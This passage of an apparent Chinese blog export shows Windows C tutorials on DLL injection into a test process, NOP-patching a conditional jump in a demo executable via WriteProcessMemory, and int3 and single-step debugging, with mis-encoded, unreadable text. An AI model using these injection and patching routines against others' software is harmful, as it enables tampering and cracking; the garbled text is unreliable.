&#125;</span><br><span class="line"></span><br><span class="line">					WaitForSingleObject(hthread, INFINITE);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				GetLastError();</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;è¿›ç¨‹æ‰“å¼€å¤±è´¥\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			CloseHandle(ç›®æ ‡è¿›ç¨‹ID);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			GetLastError();</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;æ‰¾ä¸åˆ°å¯¹åº”è¿›ç¨‹ï¼\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		GetLastError();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;è¿›ç¨‹ææƒå¤±è´¥\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* exename = <span class="string">&quot;test32.exe&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* dllname = <span class="string">&quot;32injectdll.dll&quot;</span>;</span><br><span class="line">	<span class="type">char</span>* fnname = <span class="string">&quot;fn&quot;</span>;</span><br><span class="line">	<span class="comment">//dllinject(exename,dllname);</span></span><br><span class="line">	dllinjectfn(exename, dllname, <span class="string">&quot;fn&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-05_å†…å­˜è¡¥ä¸ã€æ–­ç‚¹ä¸­æ–­ã€å•æ­¥ä¸­æ–­</title>
    <url>/posts/89f9b82/</url>
    <content><![CDATA[<h4 id="è¯»å–å†…å­˜"><a href="#è¯»å–å†…å­˜" class="headerlink" title="è¯»å–å†…å­˜"></a>è¯»å–å†…å­˜</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="type">char</span>* p = <span class="number">0x00D02030</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info = &#123; <span class="keyword">sizeof</span>(info) &#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	<span class="comment">//CreateProcess(szPath, NULL, NULL, NULL, NULL, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, NULL, NULL, &amp;info, &amp;pinfo);</span></span><br><span class="line">	<span class="comment">//ç¬¬å…­ä¸ªå‚æ•°å¯ä»¥æ”¹ä¸ºnull è¯»å–ä¸éœ€è¦ä¸€å®šçš„æƒé™</span></span><br><span class="line">	CreateProcess(szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;info, &amp;pinfo);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		ReadProcessMemory(pinfo.hProcess, p, &amp;code, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€:%p   æ•°å€¼%02x\n&quot;</span>, p, code);</span><br><span class="line">		Sleep(<span class="number">10</span>);</span><br><span class="line">		((<span class="type">char</span>*)p)++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-1.png" alt="img"></p>
<h4 id="å†…å­˜è¡¥ä¸"><a href="#å†…å­˜è¡¥ä¸" class="headerlink" title="å†…å­˜è¡¥ä¸"></a>å†…å­˜è¡¥ä¸</h4><p>å…ˆç”Ÿæˆä¸€ä¸ªasmdemo</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">;ä½¿ç”¨nmakeæˆ–ä¸‹åˆ—å‘½ä»¤è¿›è¡Œç¼–è¯‘å’Œé“¾æ¥</span><br><span class="line">;ml /c /coff HelloWorld.<span class="keyword">asm</span></span><br><span class="line">;Link /subsystem:windows HelloWorld.obj</span><br><span class="line">;*******************************************************</span><br><span class="line">;æ¨¡å¼å®šä¹‰ï¼Œåˆå§‹åŒ–å‚æ•°</span><br><span class="line">	<span class="number">.386</span>		;ä½¿ç”¨<span class="number">80386</span>å¤„ç†å™¨æŒ‡ä»¤é›†</span><br><span class="line">	.model flat,stdcall		;ç”¨æ¥å®šä¹‰ç¨‹åºå·¥ä½œçš„æ¨¡å¼ï¼Œflat:å†…å­˜æ¨¡å¼ï¼Œstdcall:è¯­è¨€æ¨¡å¼</span><br><span class="line">	option casemap:none		;æ˜¯å¦å¯¹å˜é‡ä¸å­ç¨‹åºåå¤§å°å†™æ•æ„Ÿï¼Œå¿…é¡»è¦è¿›è¡Œè®¾ç½®</span><br><span class="line">	</span><br><span class="line">;*******************************************************</span><br><span class="line">;includeå¤´æ–‡ä»¶</span><br><span class="line">;*******************************************************</span><br><span class="line">include		windows.inc</span><br><span class="line">include		user32.inc</span><br><span class="line">includelib	user32.lib</span><br><span class="line">include		kernel32.inc</span><br><span class="line">includelib	kernel32.lib</span><br><span class="line"></span><br><span class="line">;*******************************************************</span><br><span class="line">;æ•°æ®æ®µ</span><br><span class="line">;*******************************************************</span><br><span class="line">			.data</span><br><span class="line">szCaption	db	<span class="string">&#x27;æ ‡é¢˜&#x27;</span>,<span class="number">0</span></span><br><span class="line">szText1		db	<span class="string">&#x27;ä½ å¥½ï¼Œbbbb!&#x27;</span>,<span class="number">0</span></span><br><span class="line">szText2		db	<span class="string">&#x27;ä½ å¥½ï¼Œaasaa!&#x27;</span>,<span class="number">0</span></span><br><span class="line">;*******************************************************</span><br><span class="line">;ä»£ç æ®µ</span><br><span class="line">;*******************************************************</span><br><span class="line">			.code</span><br><span class="line">main proc</span><br><span class="line">		xor eax,eax</span><br><span class="line">		.<span class="keyword">if</span> eax</span><br><span class="line">			invoke MessageBoxA,<span class="literal">NULL</span>,offset szText1,offset szCaption,MB_OK</span><br><span class="line">		.<span class="keyword">else</span></span><br><span class="line">			invoke MessageBoxA,<span class="literal">NULL</span>,offset szText2,offset szCaption,MB_ICONSTOP</span><br><span class="line">		.endif</span><br><span class="line">			invoke ExitProcess,<span class="number">0</span></span><br><span class="line">main endp</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨vsæœ¬åœ°è°ƒè¯•å™¨å ä¼šè‡ªåŠ¨ç¼–è¯‘æˆexe å¦‚æœå†ç”Ÿæˆçš„è¯ä¼šæç¤ºé”™è¯¯</p>
<p><img src="/posts/89f9b82/5-2.png" alt="img"></p>
<p>ä½†æ˜¯åœ¨è¿™é‡Œ åˆ›å»ºè¿›ç¨‹åæ²¡æ³•è¿è¡Œè¿™ä¸ªasmDemo.exe æœ€åå‘ç°éœ€è¦å°†å¸¸é‡å‚æ•°åœ¨æ‰§è¡Œå‰å­˜ä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info =&#123;<span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//WinExec(&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;, SW_SHOW);</span></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	CreateProcess(szPath,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;info,&amp;pinfo);  </span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* p = <span class="number">0x00D02030</span>;	<span class="comment">//èµ·å§‹åœ°å€ ODæŸ¥çœ‹</span></span><br><span class="line">	<span class="type">short</span> oldbyte = <span class="built_in">malloc</span>(<span class="number">2</span>);	<span class="comment">//åŸæ¥çš„ åˆ†é…ä¸¤ä¸ªå­—èŠ‚</span></span><br><span class="line">	oldbyte = <span class="number">0x1574</span>;  <span class="comment">//å°æ®µå­˜å‚¨   7415 åŸæœºå™¨ç </span></span><br><span class="line">	<span class="type">short</span>* newbyte = <span class="built_in">malloc</span>(<span class="number">2</span>); <span class="comment">//æ–°ä¿®æ”¹çš„</span></span><br><span class="line"></span><br><span class="line">	HANDLE hd =  OpenProcess(PROCESS_ALL_ACCESS, TRUE, pinfo.dwProcessId);</span><br><span class="line"></span><br><span class="line">	ReadProcessMemory(hd, p,newbyte,<span class="number">2</span>,<span class="literal">NULL</span> );  <span class="comment">//ä»på¼€å§‹è¯»2ä¸ªå­—èŠ‚åˆ°cacheç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (oldbyte != *newbyte) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ä¸å¯¹ï¼Œæ— æ³•æ·»åŠ è¡¥ä¸ %p&quot;</span>,newbyte);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		*newbyte = <span class="number">0x9090</span>; <span class="comment">// nopæœºå™¨ç ä¸º90</span></span><br><span class="line">		WriteProcessMemory(hd, p, newbyte, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//ä¿®æ”¹åå˜ä¸º bbbb</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-3.png" alt="img"></p>
<h4 id="ä¸­æ–­"><a href="#ä¸­æ–­" class="headerlink" title="ä¸­æ–­"></a>ä¸­æ–­</h4><h5 id="intä¸­æ–­"><a href="#intä¸­æ–­" class="headerlink" title="intä¸­æ–­"></a>intä¸­æ–­</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	eflagså¯„å­˜å™¨ tf=1 cpuè¿›å…¥å•æ­¥ä¸­æ–­</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> int3 = <span class="number">0xcc</span>;</span><br><span class="line"><span class="type">char</span>* è¦ä¸‹æ–­ç‚¹çš„åœ°å€ = <span class="number">0x00D0202C</span>;   <span class="comment">//voidç±»å‹çš„åœ°å€æ— æ³•åšè¿ç®— è¦æ”¹æˆcharå‹</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> åŸæ¥çš„æœºå™¨ç  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* è¡¥ä¸åœ°å€ = <span class="number">0x00D02030</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> è¡¥ä¸ = <span class="number">0x9090</span>;	<span class="comment">//nop</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info = &#123; <span class="keyword">sizeof</span>(info) &#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	CreateProcess(szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;info, &amp;pinfo);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	CONTEXT çº¿ç¨‹ä¸Šä¸‹æ–‡;  <span class="comment">//å­˜æ”¾å„ç§å¯„å­˜å™¨</span></span><br><span class="line"></span><br><span class="line">	DEBUG_EVENT dbevent;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForDebugEvent(&amp;dbevent, INFINITE);  </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) &#123;  <span class="comment">//è¢«è°ƒè¯• é€€å‡º</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) &#123; <span class="comment">//è¿›ç¨‹è¢«åˆ›å»ºæ—¶</span></span><br><span class="line">			ReadProcessMemory(pinfo.hProcess, è¦ä¸‹æ–­ç‚¹çš„åœ°å€, &amp;åŸæ¥çš„æœºå™¨ç , <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			WriteProcessMemory(pinfo.hProcess, è¦ä¸‹æ–­ç‚¹çš„åœ°å€, &amp; int3, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;aaa\n&quot;</span>);</span><br><span class="line">			<span class="comment">//è¿”å›åœ¨ecxä¸­	</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//å½“è¢«è°ƒè¯•è¿›ç¨‹å‘ç”Ÿå¼‚å¸¸äº‹ä»¶ï¼Œè¢«è°ƒè¯•è¿›ç¨‹å¼€å§‹æ‰§è¡Œç¬¬ä¸€æ¡æŒ‡ä»¤å‰ æœ¬äº‹ä»¶å‘ç”Ÿä¸€æ¬¡å‘ç”Ÿ </span></span><br><span class="line">		<span class="comment">//ä»¥ååªæœ‰ å•æ­¥ä¸­æ–­ å’Œ æ–­ç‚¹ä¸­æ–­ æ‰ä¼šå‘ç”Ÿæœ¬äº‹ä»¶</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(dbevent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) &#123;  </span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;bbb\n&quot;</span>);</span><br><span class="line">			<span class="keyword">if</span> (dbevent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) &#123; <span class="comment">//   å¦‚æœæ˜¯æ–­ç‚¹ä¸­æ–­ in3ä¸­æ–­(cc)</span></span><br><span class="line">				</span><br><span class="line">				çº¿ç¨‹ä¸Šä¸‹æ–‡.ContextFlags = CONTEXT_FULL;  <span class="comment">//context_fullå…¨éƒ¨å¯„å­˜å™¨  context_segmentæ®µå¯„å­˜å™¨</span></span><br><span class="line"></span><br><span class="line">				GetThreadContext(pinfo.hThread, &amp;çº¿ç¨‹ä¸Šä¸‹æ–‡); <span class="comment">//è·å–å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (çº¿ç¨‹ä¸Šä¸‹æ–‡.Eip == è¦ä¸‹æ–­ç‚¹çš„åœ°å€ + <span class="number">1</span>) &#123;</span><br><span class="line">					WriteProcessMemory(pinfo.hProcess, è¦ä¸‹æ–­ç‚¹çš„åœ°å€, &amp;åŸæ¥çš„æœºå™¨ç , <span class="number">1</span> ,<span class="literal">NULL</span>);   <span class="comment">//å°†åŸæ¥çš„å†™å›å»</span></span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;ccc\n&quot;</span>);</span><br><span class="line">					çº¿ç¨‹ä¸Šä¸‹æ–‡.Eip--;</span><br><span class="line">					SetThreadContext(pinfo.hThread,&amp;çº¿ç¨‹ä¸Šä¸‹æ–‡);</span><br><span class="line">					WriteProcessMemory(pinfo.hProcess, è¡¥ä¸åœ°å€, &amp;è¡¥ä¸, <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ContinueDebugEvent(dbevent.dwProcessId, dbevent.dwThreadId, DBG_CONTINUE);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(pinfo.hProcess);</span><br><span class="line">	CloseHandle(pinfo.hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-4.png" alt="img"></p>
<h5 id="å•æ­¥ä¸­æ–­"><a href="#å•æ­¥ä¸­æ–­" class="headerlink" title="å•æ­¥ä¸­æ–­"></a>å•æ­¥ä¸­æ–­</h5><p>æ•ˆæœå’Œåœ¨dosboxä¸Šçš„-t å•æ­¥ä¸­æ–­ç›¸ä¼¼</p>
<p>eflagså¯„å­˜å™¨ tf=1 cpuè¿›å…¥å•æ­¥ä¸­æ–­  ç„¶åtfä¼šå†ç½®ä¸º0</p>
<p>eflagsä¸­tfåœ¨ç¬¬ä¹ä½  eflags  | 0x100</p>
<p><img src="/posts/89f9b82/5-5.png" alt="img"></p>
<p>åœ¨ä¸Šé¢çš„åŸºç¡€ä¸Šå®Œå–„</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> int3 = <span class="number">0xcc</span>;</span><br><span class="line"><span class="type">char</span>* è¦ä¸‹æ–­ç‚¹çš„åœ°å€ = <span class="number">0x00D0202C</span>;   <span class="comment">//voidç±»å‹çš„åœ°å€æ— æ³•åšè¿ç®— è¦æ”¹æˆcharå‹</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> åŸæ¥çš„æœºå™¨ç  = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* è¡¥ä¸åœ°å€ = <span class="number">0x00D02030</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> è¡¥ä¸ = <span class="number">0x9090</span>;	<span class="comment">//nop</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> code = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	STARTUPINFO  info = &#123; <span class="keyword">sizeof</span>(info) &#125;;</span><br><span class="line">	GetStartupInfo(&amp;info);</span><br><span class="line">	PROCESS_INFORMATION pinfo;</span><br><span class="line"></span><br><span class="line">	TCHAR szPath[] = TEXT(<span class="string">&quot;C:\\Users\\test\\Desktop\\AsmDEMO.exe&quot;</span>);</span><br><span class="line">	CreateProcess(szPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, DEBUG_PROCESS | DEBUG_ONLY_THIS_PROCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;info, &amp;pinfo);</span><br><span class="line"></span><br><span class="line">	CONTEXT çº¿ç¨‹ä¸Šä¸‹æ–‡;  <span class="comment">//å­˜æ”¾å„ç§å¯„å­˜å™¨</span></span><br><span class="line"></span><br><span class="line">	DEBUG_EVENT dbevent;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		WaitForDebugEvent(&amp;dbevent, INFINITE);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) &#123;  <span class="comment">//è¢«è°ƒè¯• é€€å‡º</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (dbevent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) &#123; <span class="comment">//è¿›ç¨‹è¢«åˆ›å»ºæ—¶</span></span><br><span class="line">			ReadProcessMemory(pinfo.hProcess, è¦ä¸‹æ–­ç‚¹çš„åœ°å€, &amp;åŸæ¥çš„æœºå™¨ç , <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			WriteProcessMemory(pinfo.hProcess, è¦ä¸‹æ–­ç‚¹çš„åœ°å€, &amp;int3, <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="comment">//printf(&quot;aaa\n&quot;);</span></span><br><span class="line">			<span class="comment">//è¿”å›åœ¨ecxä¸­	</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//å½“è¢«è°ƒè¯•è¿›ç¨‹å‘ç”Ÿå¼‚å¸¸äº‹ä»¶ï¼Œè¢«è°ƒè¯•è¿›ç¨‹å¼€å§‹æ‰§è¡Œç¬¬ä¸€æ¡æŒ‡ä»¤å‰ æœ¬äº‹ä»¶å‘ç”Ÿä¸€æ¬¡å‘ç”Ÿ </span></span><br><span class="line">		<span class="comment">//ä»¥ååªæœ‰ å•æ­¥ä¸­æ–­ å’Œ æ–­ç‚¹ä¸­æ–­ æ‰ä¼šå‘ç”Ÿæœ¬äº‹ä»¶</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (dbevent.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;bbb\n&quot;);</span></span><br><span class="line">			<span class="keyword">if</span> (dbevent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) &#123; <span class="comment">//   å¦‚æœæ˜¯æ–­ç‚¹ä¸­æ–­ in3ä¸­æ–­(cc)</span></span><br><span class="line"></span><br><span class="line">				çº¿ç¨‹ä¸Šä¸‹æ–‡.ContextFlags = CONTEXT_FULL;  <span class="comment">//context_fullå…¨éƒ¨å¯„å­˜å™¨  context_segmentæ®µå¯„å­˜å™¨</span></span><br><span class="line">				GetThreadContext(pinfo.hThread, &amp;çº¿ç¨‹ä¸Šä¸‹æ–‡); <span class="comment">//è·å–å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (çº¿ç¨‹ä¸Šä¸‹æ–‡.Eip == è¦ä¸‹æ–­ç‚¹çš„åœ°å€ + <span class="number">1</span>) &#123;</span><br><span class="line">					WriteProcessMemory(pinfo.hProcess, è¦ä¸‹æ–­ç‚¹çš„åœ°å€, &amp;åŸæ¥çš„æœºå™¨ç , <span class="number">1</span>, <span class="literal">NULL</span>);   <span class="comment">//å°†åŸæ¥çš„å†™å›å»</span></span><br><span class="line">					<span class="comment">//printf(&quot;ccc\n&quot;);</span></span><br><span class="line">					çº¿ç¨‹ä¸Šä¸‹æ–‡.Eip--;</span><br><span class="line">					çº¿ç¨‹ä¸Šä¸‹æ–‡.EFlags |= <span class="number">0x100</span>;  <span class="comment">//è®¾ç½®å•æ­¥ä¸­æ–­</span></span><br><span class="line">					SetThreadContext(pinfo.hThread, &amp;çº¿ç¨‹ä¸Šä¸‹æ–‡);</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(dbevent.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP) <span class="comment">//å¦‚æœæ˜¯å•æ­¥ä¸­æ–­</span></span><br><span class="line">			&#123;</span><br><span class="line">				çº¿ç¨‹ä¸Šä¸‹æ–‡.ContextFlags = CONTEXT_FULL;  <span class="comment">//context_fullå…¨éƒ¨å¯„å­˜å™¨  context_segmentæ®µå¯„å­˜å™¨</span></span><br><span class="line">				GetThreadContext(pinfo.hThread, &amp; çº¿ç¨‹ä¸Šä¸‹æ–‡);</span><br><span class="line">				<span class="built_in">putchar</span>(<span class="string">&#x27;-&#x27;</span>);</span><br><span class="line">				<span class="type">char</span> ch = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;ch); <span class="comment">//è¾“å…¥ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">				getchar();<span class="comment">//å›è½¦</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;å¯„å­˜å™¨eip:%08x  eflags:%08x  esp:%08x\n&quot;</span>, çº¿ç¨‹ä¸Šä¸‹æ–‡.Eip, çº¿ç¨‹ä¸Šä¸‹æ–‡.EFlags, çº¿ç¨‹ä¸Šä¸‹æ–‡.Esp);</span><br><span class="line"></span><br><span class="line">				<span class="comment">//è¿›å…¥å•æ­¥ä¸­æ–­å tfä¼šå†ç½®ä¸º0 æ‰€ä»¥è¦åœ¨é‡æ–°è®¾ç½®ä¸º1</span></span><br><span class="line">				çº¿ç¨‹ä¸Šä¸‹æ–‡.EFlags |= <span class="number">0x100</span>;</span><br><span class="line">				SetThreadContext(pinfo.hThread, &amp;çº¿ç¨‹ä¸Šä¸‹æ–‡);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ContinueDebugEvent(dbevent.dwProcessId, dbevent.dwThreadId, DBG_CONTINUE);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(pinfo.hProcess);</span><br><span class="line">	CloseHandle(pinfo.hThread);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/89f9b82/5-6.png" alt="img"></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-04_è¿›ç¨‹éå†ä¸å…³é—­</title>
    <url>/posts/279ff9df/</url>
    <content><![CDATA[<h4 id="è¿›ç¨‹éå†"><a href="#è¿›ç¨‹éå†" class="headerlink" title="è¿›ç¨‹éå†"></a>è¿›ç¨‹éå†</h4><p>æ•ˆæœç±»ä¼¼äºtasklist</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    HANDLE hd =  CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);  <span class="comment">//éå†æ‰€æœ‰è¿›ç¨‹</span></span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line"></span><br><span class="line">    Process32First(hd, &amp;pe);</span><br><span class="line">    <span class="keyword">while</span> (Process32Next(hd, &amp;pe)) &#123;</span><br><span class="line">        <span class="comment">//szExeFileæ˜¯WCHARå®½å­—ç¬¦å‹ï¼ŒæŠŠ%sæ”¹æˆ%lså°±å¯ä»¥äº†  